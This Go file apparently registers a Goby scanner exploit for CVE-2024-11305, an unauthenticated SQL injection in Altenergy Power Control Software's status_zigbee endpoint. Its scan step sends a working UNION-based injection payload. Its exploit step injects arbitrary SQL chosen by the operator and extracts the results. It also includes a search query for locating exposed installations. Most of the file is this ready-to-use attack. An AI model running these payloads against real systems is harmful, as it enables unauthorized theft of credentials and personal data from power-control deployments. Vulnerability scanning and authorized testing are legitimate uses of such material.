package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Altenergy Power Control Software /index.php/display/status_zigbee SQL Injection Vulnerability (CVE-2024-11305)",
    "Description": "<p>Altenergy Power Control Software is a professional software developed by Altenergy Power System, focusing on micro-inverter control, aiming to provide users with comprehensive, efficient, and secure power system control solutions. This vulnerability exists in the status_zigbee interface, allowing unauthenticated remote attackers to exploit it to obtain sensitive information from the database (e.g., admin backend passwords, user personal information), and even write trojans to the server under high privileges to further gain system control.</p>",
    "Product": "Altenergy Power Control Software",
    "Homepage": "https://www.alternergy.com/",
    "DisclosureDate": "2024-11-06",
    "PostTime": "2024-12-04",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "title=\"Altenergy Power Control Software\"",
    "GobyQuery": "title=\"Altenergy Power Control Software\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows unauthenticated attackers to perform SQL injection to obtain sensitive information from the database, potentially leading to complete server control, causing data breaches, system damage, and other severe consequences.</p>",
    "Recommendation": "<p>The vendor has released a fix to address this security issue. Users of this software are advised to refer to the following URL for the solution: <a href=\"https://apsystems.com/.\">https://apsystems.com/.</a></p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/143867459"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "select sqlite_version()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select sqlite_version()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/display/status_zigbee",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "date=2024-11-06%' UNION ALL SELECT 11 ,( CHAR ( 86 , 79 , 88 , 82 , 74 , 70 , 82 , 65 , 87 , 85 )), 33 -- wPIB"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "VOXRJFRAWU",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|define|variable|{{{fixedhostinfo}}}/index.php/display/status_zigbee"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/display/status_zigbee",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "date=2024-11-06%' UNION ALL SELECT 11 ,char(126)||char(126)||char(126)||({{{payload}}})||char(126)||char(126)||char(126), 33 -- wPIB"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~([\\s\\S]*?)~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}date=2024-11-06%'*"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2024-11305"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.3",
    "Translation": {
        "CN": {
            "Name": "Altenergy电力系统控制软件 /index.php/display/status_zigbee SQL 注入漏洞（CVE-2024-11305）",
            "Product": "Altenergy电力系统控制软件",
            "Description": "<p>Altenergy电力系统控制软件是Altenergy Power System推出的一款专业软件，专注于微型逆变器控制，旨在为用户提供全面、高效、安全的电力系统控制解决方案。该漏洞存在于status_zigbee接口处，未经身份验证的远程攻击者可以利用该漏洞获取数据库中的敏感信息（例如管理员后台密码、用户个人信息），甚至在高权限情况下可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>目前厂商已发布修复措施解决此安全问题，建议使用此软件的用户参考网址获取解决方案：<a href=\"https://apsystems.com/\">https://apsystems.com/</a>。</p>",
            "Impact": "<p>该漏洞允许未经身份验证的攻击者通过SQL注入获取数据库中的敏感信息，甚至可能导致服务器被完全控制，造成数据泄露、系统破坏等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Altenergy Power Control Software /index.php/display/status_zigbee SQL Injection Vulnerability (CVE-2024-11305)",
            "Product": "Altenergy Power Control Software",
            "Description": "<p>Altenergy Power Control Software is a professional software developed by Altenergy Power System, focusing on micro-inverter control, aiming to provide users with comprehensive, efficient, and secure power system control solutions. This vulnerability exists in the status_zigbee interface, allowing unauthenticated remote attackers to exploit it to obtain sensitive information from the database (e.g., admin backend passwords, user personal information), and even write trojans to the server under high privileges to further gain system control.</p>",
            "Recommendation": "<p>The vendor has released a fix to address this security issue. Users of this software are advised to refer to the following URL for the solution: <a href=\"https://apsystems.com/.\">https://apsystems.com/.</a></p>",
            "Impact": "<p>This vulnerability allows unauthenticated attackers to perform SQL injection to obtain sensitive information from the database, potentially leading to complete server control, causing data breaches, system damage, and other severe consequences.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "payload"
    ],
    "EditType": "fast",
    "PocId": "9975"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}